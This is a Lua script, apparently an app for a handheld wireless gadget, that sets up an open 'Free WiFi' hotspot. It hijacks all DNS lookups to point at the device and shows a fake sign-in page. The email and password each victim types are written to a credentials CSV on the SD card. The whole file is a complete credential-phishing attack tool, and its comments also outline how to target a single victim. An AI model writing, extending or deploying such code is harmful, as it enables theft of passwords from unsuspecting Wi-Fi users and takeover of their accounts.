-- Captive portal (ACTIVE): starts the device's hotspot, answers every DNS query with the device's own
-- address, and serves a sign-in page on port 80. Submitted fields are appended to sd:Captures/portal_creds.csv.
-- Runs until Back.
--
-- TARGETING: all clients. Every station that joins the hotspot gets the page.
-- MICRO-TARGETING NOT IMPLEMENTED (one client only): the SDK admits any station and the API has no
-- kick or allow-list by MAC; softap_info() gives only a count, and no client IPs. Filtering by IP
-- would need each client's DHCP lease address, which is not exposed. To add it later: get the lease
-- IP per MAC (needs a new API call), then drop requests from other IPs in handle_request().
--
-- The client IP is logged as "?" because net.accept() does not return the peer address in this API.

local PORT_HTTP = 80
local PORT_DNS = 53
local CAPTURE = "sd:Captures/portal_creds.csv"
local SSID_DEFAULT = "Free WiFi"

local W, H = 0, 0

local function txt(...) return input.text(...) or "" end

local function ip_bytes(ip)
  local a, b, c, d = ip:match("^(%d+)%.(%d+)%.(%d+)%.(%d+)$")
  if not a then return nil end
  return string.char(tonumber(a), tonumber(b), tonumber(c), tonumber(d))
end

local function url_decode(s)
  s = s:gsub("+", " ")
  return (s:gsub("%%(%x%x)", function(h) return string.char(tonumber(h, 16)) end))
end

local function form_fields(body)
  local out = {}
  for k, v in body:gmatch("([^&=]+)=([^&]*)") do out[url_decode(k)] = url_decode(v) end
  return out
end

local PAGE = [[<!doctype html><html><head><meta name="viewport" content="width=device-width"><title>Sign in</title></head>
<body style="font-family:sans-serif;max-width:360px;margin:40px auto">
<h2>Sign in to continue</h2><p>This network requires you to sign in before using the internet.</p>
<form method="POST" action="/login">
<label>Email<br><input name="email" type="text" style="width:100%"></label><br><br>
<label>Password<br><input name="password" type="password" style="width:100%"></label><br><br>
<button type="submit" style="width:100%">Sign in</button></form></body></html>]]

local DONE = [[<!doctype html><html><body style="font-family:sans-serif"><h3>Connected.</h3><p>Thanks, you can close this page.</p></body></html>]]

local function response(status, body)
  return "HTTP/1.1 " .. status .. "\r\nContent-Type: text/html\r\nContent-Length: " .. #body
    .. "\r\nConnection: close\r\n\r\n" .. body
end

local function read_request(h)
  local buf = ""
  local deadline = system.millis() + 2000
  while system.millis() < deadline do
    local d = net.read(h, 1024)
    if d == nil then break end
    if d ~= "" then buf = buf .. d end
    local he = buf:find("\r\n\r\n", 1, true)
    if he then
      local cl = tonumber(buf:match("[Cc]ontent%-[Ll]ength:%s*(%d+)") or "0") or 0
      if #buf >= he + 3 + cl then return buf, he end
    end
    app.sleep(10)
  end
  return buf, nil
end

local function write_all(h, data)
  local sent = 0
  while sent < #data do
    local n = net.write(h, data:sub(sent + 1))
    if not n then break end
    sent = sent + n
  end
end

local function log_creds(fields)
  local when = time.now() and tostring(time.now()) or "no-clock"
  if not fs.exists(CAPTURE) then fs.write(CAPTURE, "time,client_ip,email,password\n") end
  local line = string.format('%s,?,"%s","%s"\n', when,
    (fields.email or ""):gsub('"', '""'), (fields.password or ""):gsub('"', '""'))
  fs.append(CAPTURE, line)
end

local function handle_request(h)
  local req, he = read_request(h)
  local method, path = req:match("^(%u+) (%S+)")
  if method == "POST" and he then
    local body = req:sub(he + 4)
    log_creds(form_fields(body))
    write_all(h, response("200 OK", DONE))
  elseif method == "GET" and path == "/" then
    write_all(h, response("200 OK", PAGE))
  else
    -- any other path: send the sign-in page (captive-portal style redirect target)
    write_all(h, response("200 OK", PAGE))
  end
  net.close(h)
end

-- DNS: answer every A query with our own address.
local function dns_answer(q, ip)
  if #q < 13 then return nil end
  local i = 13
  while i <= #q and q:byte(i) ~= 0 do i = i + q:byte(i) + 1 end
  local qend = i + 4
  if qend > #q then return nil end
  local question = q:sub(13, qend)
  return q:sub(1, 2) .. "\129\128" .. "\0\1" .. "\0\1" .. "\0\0" .. "\0\0"
    .. question .. "\192\12" .. "\0\1" .. "\0\1" .. "\0\0\0\60" .. "\0\4" .. ip
end

local function draw(lines, footer)
  gfx.clear(); W, H = gfx.size()
  gfx.rect(0, 0, W, 40, true); gfx.text(14, 10, "Captive portal (ACTIVE)", "ui12", "bw")
  local y = 56
  for _, l in ipairs(lines) do gfx.text(14, y, l, "ui12"); y = y + 28 end
  gfx.text(14, H - 34, footer or "Back = stop", "small")
  gfx.present()
end

local function main()
  W, H = gfx.size()
  local ssid = txt("Hotspot name", SSID_DEFAULT, 32)
  if ssid == "" then ssid = SSID_DEFAULT end
  local pw = txt("Password (blank = OPEN network)", "", 63, "password")
  local opts = {}
  if pw ~= "" then
    if #pw < 8 then draw({ "Password must be 8-63 characters." }, "Back = exit"); while input.wait() ~= "back" do end; return end
    opts.password = pw
  end
  draw({ "Starting hotspot..." }, "")
  local ok, ip = wifi.softap(ssid, opts)
  if not ok then draw({ "hotspot failed:", tostring(ip) }, "Back = exit"); while input.wait() ~= "back" do end; return end
  local bytes = ip_bytes(ip)
  local dns = net.udp_open(PORT_DNS)
  local server = net.listen(PORT_HTTP)
  if not dns or not server then
    draw({ "could not bind ports:", "dns " .. tostring(dns) .. "  http " .. tostring(server) }, "Back = exit")
    while input.wait() ~= "back" do end
    return
  end
  local served = 0
  local last_draw = -1000
  while true do
    local now = system.millis()
    local r = net.udp_recv(dns)
    while r do
      local resp = bytes and dns_answer(r.data, bytes)
      if resp then net.udp_send(dns, r.ip, r.port, resp) end
      r = net.udp_recv(dns)
    end
    local c = net.accept(server)
    if c then
      handle_request(c)
      served = served + 1
    end
    if now - last_draw >= 1000 then
      local info = wifi.softap_info() or {}
      draw({ "SSID: " .. ssid, "IP:   " .. ip, "stations: " .. tostring(info.clients or 0),
        "requests served: " .. served, "logged to: Captures/portal_creds.csv" }, "Back = stop")
      last_draw = now
    end
    if input.poll() == "back" then break end
    app.sleep(20)
  end
  net.udp_close(dns)
  net.close(server)
  wifi.off()
end

local ok, err = pcall(main)
pcall(function() wifi.off() end)
if not ok then
  gfx.clear(); gfx.text(10, 10, "err: " .. tostring(err):sub(1, 60), "ui12", "b"); gfx.present()
  while input.wait() ~= "back" do end
end
app.exit()
